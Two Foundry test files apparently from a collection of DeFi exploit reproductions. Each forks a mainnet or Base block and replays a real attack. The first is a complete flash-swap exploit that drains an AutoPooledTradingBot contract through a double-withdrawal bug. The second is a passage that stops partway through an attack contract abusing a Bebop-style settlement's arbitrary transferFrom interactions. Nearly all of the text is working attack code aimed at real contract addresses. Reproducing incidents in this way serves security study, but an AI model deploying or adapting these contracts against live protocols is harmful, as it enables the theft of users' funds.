pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 0.15198 ETH
// Attacker : 0x8A6ce2d90EE1199F815628970a90dF73e12B5057
// Attack Contract : 0xe033880fed8A54C1F37230cC3b25aCFB1c9d4185
// Vulnerable Contract : 0x879e993e2E37DE3b47F38C13858e1f337D51448B
// Attack Tx : https://etherscan.io/tx/0x9ec3fb4ac39e179c6a4f5323f2f757faca7b71718fc9f752153387c9204cee3d
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x879e993e2E37DE3b47F38C13858e1f337D51448B#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1676
//
// Attack summary: The attacker deposited flash-borrowed ETH, withdrew 90% through withdrawInvestment, then
// emergency-withdrew the still-existing shares from the same deposit.
// Root cause: withdrawInvestment pays from totalInvested but does not burn shares or reduce pool accounting,
// leaving emergencyWithdrawAll able to pay the same position again.

address constant ATTACKER = 0x8A6ce2d90EE1199F815628970a90dF73e12B5057;
address constant VULNERABLE_CONTRACT = 0x879e993e2E37DE3b47F38C13858e1f337D51448B;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant WETH_SPX_PAIR = 0x52c77b0CB827aFbAD022E6d6CAF2C44452eDbc39;

interface IWETH {
    function deposit() external payable;
    function withdraw(
        uint256 wad
    ) external;
    function transfer(
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IAutoPooledTradingBot {
    function deposit(
        address referrer
    ) external payable;
    function withdrawInvestment(
        uint256 minExpected
    ) external;
    function emergencyWithdrawAll() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 23_160_803;
        vm.createSelectFork("mainnet", forkBlock);

        vm.label(ATTACKER, "Attacker");
        vm.label(VULNERABLE_CONTRACT, "AutoPooledTradingBot");
        vm.label(WETH, "WETH");
        vm.label(WETH_SPX_PAIR, "WETH-SPX Pair");
    }

    function testExploit() public {
        vm.deal(ATTACKER, 0);
        uint256 attackerEthBefore = ATTACKER.balance;

        // step 1: use the same no-upfront-capital shape as the trace by borrowing WETH from the pair.
        vm.startPrank(ATTACKER);
        FlashSwapAttacker flashSwapAttacker = new FlashSwapAttacker(ATTACKER);
        vm.label(address(flashSwapAttacker), "Local Flash Swap Attacker");
        flashSwapAttacker.execute();
        vm.stopPrank();

        // step 2: assert the doubled-withdrawal path produces net ETH after repaying the pair.
        uint256 attackerEthAfter = ATTACKER.balance;
        emit log_named_decimal_uint("Attacker ETH profit", attackerEthAfter - attackerEthBefore, 18);
        assertGt(attackerEthAfter - attackerEthBefore, 0.15 ether);
    }
}

contract FlashSwapAttacker is IUniswapV2Callee {
    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function execute() external {
        uint256 borrowAmount = 0.192 ether;
        IUniswapV2Pair(WETH_SPX_PAIR).swap(borrowAmount, 0, address(this), abi.encode(borrowAmount));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external override {
        require(msg.sender == WETH_SPX_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        // step 3: unwrap the flash-borrowed WETH and create a fresh victim position.
        IWETH(WETH).withdraw(amount0);
        IAutoPooledTradingBot(VULNERABLE_CONTRACT).deposit{value: amount0}(address(0));

        // step 4: withdrawInvestment pays from totalInvested but leaves shares in place.
        IAutoPooledTradingBot(VULNERABLE_CONTRACT).withdrawInvestment(0);

        // step 5: emergencyWithdrawAll pays the same still-existing shares again.
        IAutoPooledTradingBot(VULNERABLE_CONTRACT).emergencyWithdrawAll();

        // step 6: repay the WETH flash swap, then forward the remaining ETH profit.
        uint256 repayAmount = (amount0 * 1000) / 997 + 1;
        IWETH(WETH).deposit{value: repayAmount}();
        IWETH(WETH).transfer(WETH_SPX_PAIR, repayAmount);

        (bool sent,) = payable(profitReceiver).call{value: address(this).balance}("");
        require(sent, "profit transfer failed");
    }

    receive() external payable {}
}


// Source: src/test/2025-08/BaseBebopSettlement_exp.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 3,875.46 USD
// Attacker : 0x473993E254be8D46eD85b149335b2Be02b2891f1
// Attack Contract : 0xbf8e523170875107fD3c36C6Cf3e350DC52a5021
// Vulnerable Contract : 0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6
// Attack Tx : https://basescan.org/tx/0x9099383a0731fcd40550f6443c935f579085251d34b7c7285603f68b7c12f678
//
// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1660
//
// Attack summary: The attacker deployed initcode that created a helper contract and called a Bebop-style settlement
// function. The settlement call carried two explicit transferFrom interactions, moving USDC from one approved account
// and a wrapped asset from the reported victim to the attacker.
// Root cause: the unverified settlement contract accepted caller-controlled interaction calldata and executed token
// transferFrom calls against accounts that had granted it allowance.

address constant ATTACKER = 0x473993E254be8D46eD85b149335b2Be02b2891f1;
address constant ATTACK_CONTRACT = 0xbf8e523170875107fD3c36C6Cf3e350DC52a5021;
address constant VICTIM = 0x9eaC82DF212c6c85a125F6c7db3285f4Db93dD7b;
address constant SETTLEMENT = 0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6;
address constant USDC_HOLDER = 0x78300ee5b60f6Fe87D64c02F393dEe502560EE87;
address constant USDC_TOKEN = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant VICTIM_TOKEN = 0x2615a94df961278DcbC41Fb0a54fEc5f10a693aE;

uint256 constant USDC_AMOUNT = 1_000_000_000;
uint256 constant VICTIM_TOKEN_AMOUNT = 901_467_122_762_682_970_176;

interface IBebopSettlement {
    struct Order {
        address maker;
        address receiver;
        uint256 expiry;
        uint256 nonce;
        uint256 flags;
        address executor;
        uint256 partnerId;
        address[] makerTokens;
        address[] takerTokens;
        uint256[] makerAmounts;
        uint256[] takerAmounts;
        bool usePermit2;
    }

    struct Interaction {
        bool result;
        address target;
        uint256 value;
        bytes data;
    }

    function settle(
        Order calldata order,
        bytes calldata signature,
        Interaction[] calldata interactions,
        bytes calldata data,
        address receiver
    ) external payable;
}

contract ContractTest is BaseTestWithBalanceLog {
    BaseBebopSettlementAttack private exploit;

    function setUp() public {
        uint256 forkBlock = 34_100_255;
        vm.createSelectFork("base", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VICTIM, "Victim");
        vm.label(SETTLEMENT, "Settlement");
        vm.label(USDC_HOLDER, "USDC Holder");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(VICTIM_TOKEN, "Victim Token");

        exploit = new BaseBebopSettlementAttack();
        multiAssetLog = true;
        attacker = address(exploit);
        _addFundingToken(USDC_TOKEN);
        _addFundingToken(VICTIM_TOKEN);
    }

    function testExploit() public balanceLog {
        uint256 usdcHolderBefore = IERC20(USDC_TOKEN).balanceOf(USDC_HOLDER);
        uint256 victimTokenBefore = IERC20(VICTIM_TOKEN).balanceOf(VICTIM);

        exploit.run();

        assertEq(IERC20(USDC_TOKEN).balanceOf(address(exploit)), USDC_AMOUNT, "USDC profit");
        assertEq(IERC20(VICTIM_TOKEN).balanceOf(address(exploit)), VICTIM_TOKEN_AMOUNT, "victim-token profit");
        assertEq(usdcHolderBefore - IERC20(USDC_TOKEN).balanceOf(USDC_HOLDER), USDC_AMOUNT, "USDC holder loss");
        assertEq(victimTokenBefore - IERC20(VICTIM_TOKEN).balanceOf(VICTIM), VICTIM_TOKEN_AMOUNT, "victim token loss");
    }
}

contract BaseBebopSettlementAttack {
    function run() external {
        IBebopSettlement.Order memory order;
        order.maker = address(this);
        order.receiver = address(this);
        order.expiry = block.timestamp + 60;
        order.flags = 1;
        order.executor = address(this);

        IBebopSettlement.Interaction[] memory interactions = new IBebopSettlement.Interaction[](2);
